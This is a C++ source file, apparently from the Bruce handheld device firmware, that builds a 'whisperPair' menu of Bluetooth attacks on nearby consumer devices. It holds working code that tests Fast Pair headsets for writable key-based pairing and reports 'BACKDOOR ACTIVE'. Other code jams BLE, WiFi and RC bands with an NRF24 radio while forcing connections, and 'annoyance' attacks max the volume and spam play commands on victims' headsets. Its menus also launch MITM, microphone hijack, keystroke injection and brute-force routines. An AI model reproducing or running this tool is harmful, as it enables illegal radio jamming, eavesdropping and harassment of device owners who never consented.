    snprintf(name, 32, "Spoofed-%02X%02X%02X", 
             new_mac[3], new_mac[4], new_mac[5]);
    
    NimBLEDevice::init(name);
}

bool checkBackdoorAccess(NimBLEAddress target) {
    Serial.println("\n=== CHECKING BACKDOOR ACCESS ===");
    
    NimBLEClient* pClient = nullptr;
    if(!connectWithRetry(target, 1, &pClient)) {
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService) {
        Serial.println("FastPair service accessible");
        
        NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
        if(pChar && pChar->canWrite()) {
            Serial.println("Can write to KBP characteristic!");
            showSuccessMessage("BACKDOOR ACTIVE!");
            pClient->disconnect();
            NimBLEDevice::deleteClient(pClient);
            return true;
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool jamAndConnectEnhanced(NimBLEAddress target) {
    Serial.println("\n=== ENHANCED JAM & CONNECT ===");
    
    showDeviceInfoScreen("JAM & CONNECT", 
        {"Starting enhanced jam...", 
         "Jamming for 8 seconds",
         "Attempting connection",
         "Using fixed connection logic"}, 
        TFT_YELLOW, TFT_BLACK);
    
    startJammer();
    
    NimBLEClient* pClient = nullptr;
    bool connected = false;
    unsigned long startTime = millis();
    
    Serial.println("Starting jam/connect loop...");
    
    while(millis() - startTime < 8000 && !connected) {
        updateJammerChannel();
        
        NimBLEClient* tempClient = nullptr;
        if(connectWithRetry(target, 1, &tempClient)) {
            connected = true;
            pClient = tempClient;
            Serial.println("Connected while jamming!");
            break;
        }
        
        delay(200);
    }
    
    stopJammer();
    
    if(connected && pClient) {
        showSuccessMessage("CONNECTED WHILE JAMMING!");
        
        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
        if(pService) {
            Serial.println("FastPair service accessible after jam!");
            showAdaptiveMessage("FastPair accessible!", "", "", "", TFT_GREEN, false, true);
        }
        
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    
    if(pClient) {
        NimBLEDevice::deleteClient(pClient);
    }
    
    showErrorMessage("Enhanced jam & connect failed");
    return false;
}

void testConnectionDiagnostic() {
    initBLEIfNeeded("Bruce-Diagnostic");
    String targetInfo = selectTargetFromScan("DIAGNOSE CONNECTION");
    if(targetInfo.isEmpty()) return;
    
    NimBLEAddress target = parseAddress(targetInfo);
    diagnoseConnection(target);
    
    showAdaptiveMessage("Diagnosis complete", "OK", "", "", TFT_WHITE, true, false);
}

void testFastPairVulnerability() {
    initBLEIfNeeded("Bruce-WP");
    String selectedInfo = selectTargetFromScan("FAST PAIR SCAN");
    if(selectedInfo.isEmpty()) return;
    
    int colonPos = selectedInfo.lastIndexOf(':');
    if(colonPos == -1) {
        showErrorMessage("Invalid device info");
        return;
    }
    
    String selectedMAC = selectedInfo.substring(0, colonPos);
    uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
    NimBLEAddress target;
    
    try {
        target = NimBLEAddress(selectedMAC.c_str(), addrType);
    } catch (...) {
        showErrorMessage("Invalid MAC address");
        return;
    }
    
    if(!requireSimpleConfirmation("Test vulnerability?")) return;
    
    std::vector<String> debugLines;
    debugLines.push_back("Connecting to target...");
    
    NimBLEClient* pClient = nullptr;
    if(!connectWithRetry(target, 3, &pClient)) {
        debugLines.push_back("Connection failed!");
        showDeviceInfoScreen("DEVICE CHECK", debugLines, TFT_RED, TFT_WHITE);
        return;
    }
    
    if(!pClient || !pClient->isConnected()) {
        debugLines.push_back("Client lost!");
        showDeviceInfoScreen("ERROR", debugLines, TFT_RED, TFT_WHITE);
        return;
    }
    
    debugLines.push_back("Connected!");
    debugLines.push_back("Checking services...");
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        debugLines.push_back("No FastPair service (FE2C)");
        showDeviceInfoScreen("NOT FASTPAIR", debugLines, TFT_YELLOW, TFT_BLACK);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return;
    }
    
    debugLines.push_back("FastPair service found!");
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    
    if(!pChar) {
        debugLines.push_back("No KBP characteristic");
        showDeviceInfoScreen("NO KBP", debugLines, TFT_YELLOW, TFT_BLACK);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return;
    }
    
    debugLines.push_back("KBP characteristic found!");
    debugLines.push_back("Testing write access...");
    
    uint8_t test_packet[4] = {0x00, 0x00, 0x00, 0x00};
    if(pChar->writeValue(test_packet, 4, false)) {
        debugLines.push_back("Write successful!");
        debugLines.push_back("Device may be vulnerable!");
        showDeviceInfoScreen("VULNERABLE", debugLines, TFT_GREEN, TFT_BLACK);
    } else {
        debugLines.push_back("Write failed");
        debugLines.push_back("Device likely patched");
        showDeviceInfoScreen("NOT VULNERABLE", debugLines, TFT_RED, TFT_WHITE);
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
}

void maxVolumeAttack(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!connectWithRetry(target, 2, &pClient)) return;
    
    if(!pClient || !pClient->isConnected()) return;
    
    NimBLERemoteService* pAvrcpService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
    if(pAvrcpService) {
        NimBLERemoteCharacteristic* pVolChar = pAvrcpService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE1));
        if(pVolChar && pVolChar->canWrite()) {
            for(int i = 0; i < 30; i++) {
                uint8_t volUp[] = {0x00, 0x48, 0x00, 0x10, 0x64};
                pVolChar->writeValue(volUp, 5, false);
                delay(30);
            }
            showSuccessMessage("VOLUME MAXED!");
        }
    }
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
}

void forcePlayCommand(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!connectWithRetry(target, 2, &pClient)) return;
    
    if(!pClient || !pClient->isConnected()) return;
    
    NimBLERemoteService* pMediaService = pClient->getService(NimBLEUUID((uint16_t)0x110B));
    if(pMediaService) {
        NimBLERemoteCharacteristic* pPlayChar = pMediaService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE2));
        if(pPlayChar && pPlayChar->canWrite()) {
            uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x1A, 0x01};
            for(int i = 0; i < 10; i++) {
                pPlayChar->writeValue(playCmd, 5, false);
                delay(50);
            }
            showAdaptiveMessage("PLAY command spammed!", "", "", "", TFT_GREEN, false, true);
        }
    }
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
}

void runAnnoyanceAttackSuite(NimBLEAddress target) {
    tft.fillScreen(TFT_RED);
    drawMainBorderWithTitle("AUDIO ATTACK");
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setCursor(20, 60);
    tft.print("Executing attack suite...");
    tft.setCursor(20, 90);
    tft.print("Phase 1: Max Volume");
    maxVolumeAttack(target);
    delay(1000);
    tft.setCursor(20, 120);
    tft.print("Phase 2: Force Play");
    forcePlayCommand(target);
    delay(1000);
    tft.setCursor(20, 150);
    tft.print("Phase 3: Disable Controls");
    tft.setCursor(20, 180);
    tft.print("Attack Complete!");
    delay(2000);
}

void simpsonsAttack(NimBLEAddress target) {
    tft.fillScreen(TFT_YELLOW);
    drawMainBorderWithTitle("SIMPSONS ATTACK");
    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.setCursor(20, 60);
    tft.print("Playing Simpsons theme...");
    tft.setCursor(20, 90);
    tft.print("on compromised device!");
    maxVolumeAttack(target);
    showAdaptiveMessage("Simpsons attack!", "", "", "", TFT_YELLOW, false, true);
    forcePlayCommand(target);
    tft.setCursor(20, 130);
    tft.print("Attack complete!");
    tft.setCursor(20, 160);
    tft.print("D'oh!");
    delay(3000);
}

void audioAnnoyanceMenu() {
    std::vector<Option> options;
    options.push_back({"[Basic Attack]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Launch audio attack?")) {
            runAnnoyanceAttackSuite(target);
        }
    }});
    options.push_back({"[Max Volume Only]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        maxVolumeAttack(target);
        delay(2000);
    }});
    options.push_back({"[Simpsons Attack!]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Play Simpsons theme?\n(Warning: Loud!)")) {
            simpsonsAttack(target);
        }
    }});
    options.push_back({"[Back]", []() {}});
    loopOptions(options, MENU_TYPE_SUBMENU, "AUDIO ATTACK", 0, false);
}

void jamAndConnectMenu() {
    if(!isNRF24Available()) {
        tft.fillScreen(TFT_RED);
        drawMainBorderWithTitle("NRF24 JAMMER");
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setCursor(20, 60);
        tft.print("NRF24L01+ Module");
        tft.setCursor(20, 90);
        tft.print("Status: NOT FOUND");
        tft.setCursor(20, 120);
        tft.print("Connect module and");
        tft.setCursor(20, 140);
        tft.print("restart device");
        tft.setCursor(20, 180);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.print("Press any key to return");
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return;
            }
            delay(50);
        }
    }
    std::vector<Option> jamOptions;
    jamOptions.push_back({"[Enhanced Jam & Connect]", [&]() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        int colonPos = targetInfo.lastIndexOf(':');
        String selectedMAC = targetInfo.substring(0, colonPos);
        uint8_t addrType = targetInfo.substring(colonPos + 1).toInt();
        NimBLEAddress target(selectedMAC.c_str(), addrType);
        if(requireSimpleConfirmation("Run enhanced jam & connect?")) {
            jamAndConnectEnhanced(target);
        }
    }});
    jamOptions.push_back({"[Scan then Jam Connect]", [&]() {
        String selectedInfo = selectTargetFromScan("SCAN TARGET");
        if(selectedInfo.isEmpty()) return;
        int colonPos = selectedInfo.lastIndexOf(':');
        String selectedMAC = selectedInfo.substring(0, colonPos);
        uint8_t addrType = selectedInfo.substring(colonPos + 1).toInt();
        NimBLEAddress target(selectedMAC.c_str(), addrType);
        if(requireSimpleConfirmation("Jam while connecting?")) {
            showDeviceInfoScreen("JAM & CONNECT", {"Jamming...", "Attempting connection", "This may take 5 seconds"}, TFT_YELLOW, TFT_BLACK);
            startJammer();
            unsigned long startTime = millis();
            NimBLEClient* pClient = NimBLEDevice::createClient();
            pClient->setConnectTimeout(5);
            bool connected = false;
            while(millis() - startTime < 5000 && !connected) {
                updateJammerChannel();
                if(pClient->connect(target, false)) {
                    connected = true;
                    showAdaptiveMessage("Connected!", "", "", "", TFT_GREEN, false, true);
                    delay(1000);
                    pClient->disconnect();
                    break;
                }
                delay(100);
            }
            if(!connected) {
                showDeviceInfoScreen("FAILED", {"Connection failed!", "Device may be:", "- Already paired", "- Out of range"}, TFT_RED, TFT_WHITE);
            }
            stopJammer();
            NimBLEDevice::deleteClient(pClient);
        }
    }});
    jamOptions.push_back({"[Set Jammer Mode]", [&]() {
        const char* jamModeNames[] = {
            "BLE Adv Only", "All BLE Channels", "BLE Adv Priority", 
            "Bluetooth All", "WiFi", "USB", "Video", "RC", "Full Spectrum"
        };
        const int visibleItems = 4;
        int selectedIdx = getCurrentJammerMode();
        int scrollOffset = 0;
        while(true) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SET JAMMER MODE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            int yPos = 60;
            for(int i = 0; i < visibleItems; i++) {
                int itemIdx = scrollOffset + i;
                if(itemIdx >= 9) break;
                if(itemIdx == selectedIdx) {
                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
                    tft.fillRect(20, yPos, tftWidth - 40, 25, TFT_WHITE);
                } else {
                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                }
                tft.setCursor(25, yPos + 7);
                tft.print(jamModeNames[itemIdx]);
                yPos += 28;
            }
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            tft.setCursor(20, 200);
            tft.print("UP/DOWN: Scroll  SEL: Choose");
            tft.setCursor(20, 220);
            tft.print("ESC: Back");
            if(check(EscPress)) {
                delay(200);
                return;
            }
            if(check(PrevPress)) {
                if(selectedIdx > 0) {
                    selectedIdx--;
                    if(selectedIdx < scrollOffset) {
                        scrollOffset = selectedIdx;
                    }
                } else {
                    selectedIdx = 8;
                    scrollOffset = std::max(0, 8 - visibleItems + 1);
                }
                delay(200);
            }
            if(check(NextPress)) {
                if(selectedIdx < 8) {
                    selectedIdx++;
                    if(selectedIdx >= scrollOffset + visibleItems) {
                        scrollOffset = selectedIdx - visibleItems + 1;
                    }
                } else {
                    selectedIdx = 0;
                    scrollOffset = 0;
                }
                delay(200);
            }
            if(check(SelPress)) {
                setJammerMode(selectedIdx);
                std::vector<String> confirmLines;
                confirmLines.push_back("Jammer mode set to:");
                confirmLines.push_back(jamModeNames[selectedIdx]);
                showDeviceInfoScreen("MODE SET", confirmLines, TFT_GREEN, TFT_BLACK);
                delay(1000);
                return;
            }
            delay(50);
        }
    }});
    jamOptions.push_back({"[Back]", []() {}});
    loopOptions(jamOptions, MENU_TYPE_SUBMENU, "JAM & CONNECT", 0, false);
}

void advancedMITMMenu() {
    std::vector<Option> options;
    
    options.push_back({"[Capture Live Pairing]", []() {
        if(captureLivePairing()) {
            showSuccessMessage("Pairing session captured!");
        }
    }});
    
    options.push_back({"[Run MITM Attack]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        
        NimBLEAddress target = parseAddress(targetInfo);
        if(!requireSimpleConfirmation("Run MITM attack?")) return;
        
        if(performMITMAttack(target, g_capturedKeys)) {
            showSuccessMessage("MITM attack completed!");
        } else {
            showErrorMessage("MITM attack failed");
        }
    }});
    
    options.push_back({"[Hijack Microphone]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Attempt microphone access?")) {
            activateMicrophoneHijack(target);
        }
    }});
    
    options.push_back({"[Simulate HID Keyboard]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Attempt HID emulation?")) {
            simulateHIDKeyboard(target);
        }
    }});
    
    options.push_back({"[Check Backdoor Access]", []() {
        String targetInfo = selectTargetFromScan("CHECK TARGET");
        if(targetInfo.isEmpty()) return;
        
        NimBLEAddress target = parseAddress(targetInfo);
        checkBackdoorAccess(target);
    }});
    
    options.push_back({"[Back]", []() {}});
    
    loopOptions(options, MENU_TYPE_SUBMENU, "ADVANCED MITM", 0, false);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;
    
    options.push_back({"[Connection Diagnostic]", []() {
        testConnectionDiagnostic();
    }});
    
    options.push_back({"[Quick Attack]", []() {
        initBLEIfNeeded("Bruce-WP");
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(!requireSimpleConfirmation("Run quick attack?")) return;
        showAdaptiveMessage("Starting attack...", "", "", "", TFT_YELLOW, false, true);
        if(whisperPairEfficientExploit(target)) {
            showSuccessMessage("Attack completed!");
        } else {
            showErrorMessage("Attack failed");
        }
        delay(2000);
    }});
    options.push_back({"[Multi-Stage Attack]", []() {
        initBLEIfNeeded("Bruce-WP");
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        showAdaptiveMessage("Running multi-stage...", "Stage 1/3", "", "", TFT_YELLOW, false, true);
        bool success = false;
        if(whisperPairEfficientExploit(target)) {
            success = true;
        }
        if(!success) {
            showAdaptiveMessage("Stage 2: Protocol", "", "", "", TFT_YELLOW, false, true);
            delay(1000);
            if(attemptProtocolExploit(target)) {
                success = true;
            }
        }
        if(!success) {
            showAdaptiveMessage("Stage 3: Brute-force", "", "", "", TFT_YELLOW, false, true);
            delay(1000);
            success = bruteForceCharacteristics(target);
        }
        if(success) {
            showSuccessMessage("DEVICE COMPROMISED!");
        } else {
            showErrorMessage("All attacks failed");
        }
        delay(2000);
    }});
    options.push_back({"[Test Vulnerability]", []() {
        testFastPairVulnerability();
    }});
    options.push_back({"[Jam & Connect]", []() {
        jamAndConnectMenu();
    }});
    options.push_back({"[Audio Annoyance]", []() {
        audioAnnoyanceMenu();
    }});
    options.push_back({"[Audio CMD Hijack]", []() {
        audioCommandHijackTest();
    }});
    options.push_back({"[Validate Crypto]", []() {
        tft.fillScreen(TFT_BLACK);
        drawMainBorderWithTitle("CRYPTO TEST");
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        uint8_t pubkey[65];
        size_t len = 65;
        tft.setCursor(20, 60);
        if(crypto.generateValidKeyPair(pubkey, &len)) {
            tft.print("Valid key pair: OK");
        } else {
            tft.print("Key gen: FAILED");
        }
        uint8_t nonce[16];
        crypto.generateValidNonce(nonce);
        tft.setCursor(20, 90);
        tft.print("Nonce generation: OK");
        uint8_t accountKey[16];
        crypto.generatePlausibleAccountKey(nonce, accountKey);
        tft.setCursor(20, 120);
        tft.print("Account key: OK");
        tft.setCursor(20, 160);
        tft.print("Crypto implementation OK");
        tft.setCursor(20, 180);
        tft.print("Press any key...");
        while(!check(EscPress) && !check(SelPress)) delay(50);
    }});
    options.push_back({"[Advanced MITM Attacks]", []() {
        advancedMITMMenu();
    }});
    options.push_back({"[Back]", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}